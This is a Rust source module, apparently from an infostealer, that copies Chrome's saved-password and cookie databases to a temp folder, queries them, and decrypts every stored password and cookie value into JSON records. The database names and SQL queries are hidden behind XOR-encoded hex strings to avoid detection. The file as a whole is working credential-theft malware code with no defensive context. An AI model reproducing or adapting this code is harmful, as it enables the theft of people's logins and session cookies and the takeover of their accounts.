
use std::{fs, path::Path};

use rusqlite::{Connection, OpenFlags};
use serde_json::{json, Value};

use crate::crypto;
use crate::xor::decode as obf_decode;

const LOGIN_DATA: &str = "16353d33347a1e3b2e3b";
const SQL_PASSWORDS: &str = "091f161f190e7a3528333d3334052f2836767a2f293f28343b373f052c3b362f3f767a2a3b29292d35283e052c3b362f3f7a1c0815177a36353d333429";
const SQL_COOKIES: &str = "091f161f190e7a3235292e05313f23767a343b373f767a3f343928232a2e3f3e052c3b362f3f767a2a3b2e327a1c0815177a39353531333f297a161317130e7a6f6a6a";
const NETWORK: &str = "143f2e2d352831";
const COOKIES: &str = "19353531333f29";

pub fn extract_passwords(profile_dir: &Path, master_key: &[u8]) -> Result<Vec<Value>, String> {
    let master_key: &[u8; 32] = master_key.try_into().map_err(|_| "key not 32 bytes".to_string())?;
    let login_data = profile_dir.join(obf_decode(LOGIN_DATA));

    let tmp = copy_db_to_temp(&login_data, "chrome_login_data_tmp.db")?;
    let conn = Connection::open_with_flags(
        &tmp,
        OpenFlags::SQLITE_OPEN_READ_ONLY | OpenFlags::SQLITE_OPEN_NO_MUTEX,
    )
    .map_err(|e| format!("open Login Data: {e}"))?;

    let mut stmt = conn
        .prepare(obf_decode(SQL_PASSWORDS))
        .map_err(|e| format!("prepare: {e}"))?;

    let rows: Vec<Value> = stmt
        .query_map([], |row| {
            let url: String = row.get(0)?;
            let username: String = row.get(1)?;
            let enc_pass: Vec<u8> = row.get(2)?;
            Ok((url, username, enc_pass))
        })
        .map_err(|e| format!("query: {e}"))?
        .filter_map(|r| r.ok())
        .map(|(url, username, enc_pass)| {
            let password = if enc_pass.is_empty() {
                String::new()
            } else {
                match crypto::decrypt_value(&enc_pass, master_key) {
                    Ok(p) => p,
                    Err(_) => crypto::hex_fallback(&enc_pass),
                }
            };
            json!({
                "url": url,
                "username": username,
                "password": password,
            })
        })
        .collect();

    let _ = fs::remove_file(&tmp);
    Ok(rows)
}


pub fn extract_cookies(profile_dir: &Path, master_key: &[u8]) -> Result<Vec<Value>, String> {
    let master_key: &[u8; 32] = master_key.try_into().map_err(|_| "key not 32 bytes".to_string())?;
    let cookies_path = {
        let net = profile_dir.join(obf_decode(NETWORK)).join(obf_decode(COOKIES));
        if net.exists() {
            net
        } else {
            profile_dir.join(obf_decode(COOKIES))
        }
    };

    let tmp = copy_db_to_temp(&cookies_path, "chrome_cookies_tmp.db")?;
    let conn = Connection::open_with_flags(
        &tmp,
        OpenFlags::SQLITE_OPEN_READ_ONLY | OpenFlags::SQLITE_OPEN_NO_MUTEX,
    )
    .map_err(|e| format!("open Cookies: {e}"))?;

    let mut stmt = conn
        .prepare(obf_decode(SQL_COOKIES))
        .map_err(|e| format!("prepare cookies: {e}"))?;

    let rows: Vec<Value> = stmt
        .query_map([], |row| {
            let host: String = row.get(0)?;
            let name: String = row.get(1)?;
            let enc_val: Vec<u8> = row.get(2)?;
            let path: String = row.get(3)?;
            Ok((host, name, enc_val, path))
        })
        .map_err(|e| format!("query cookies: {e}"))?
        .filter_map(|r| r.ok())
        .map(|(host, name, enc_val, path)| {
            let value = if enc_val.is_empty() {
                String::new()
            } else {
                match crypto::decrypt_value(&enc_val, master_key) {
                    Ok(v) => v,
                    Err(_) => crypto::hex_fallback(&enc_val),
                }
            };
            json!({
                "host": host,
                "name": name,
                "value": value,
                "path": path,
            })
        })
        .collect();

    let _ = fs::remove_file(&tmp);
    Ok(rows)
}


fn copy_db_to_temp(src: &Path, tmp_name: &str) -> Result<std::path::PathBuf, String> {
    let tmp = std::env::temp_dir().join(tmp_name);

    for attempt in 1..=3 {
        match fs::copy(src, &tmp) {
            Ok(_) => return Ok(tmp),
            Err(e) if attempt < 3 => {
                std::thread::sleep(std::time::Duration::from_millis(500 * attempt));
            }
            Err(e) => return Err(format!("copy {} to temp: {e}", src.display())),
        }
    }
    unreachable!()
}
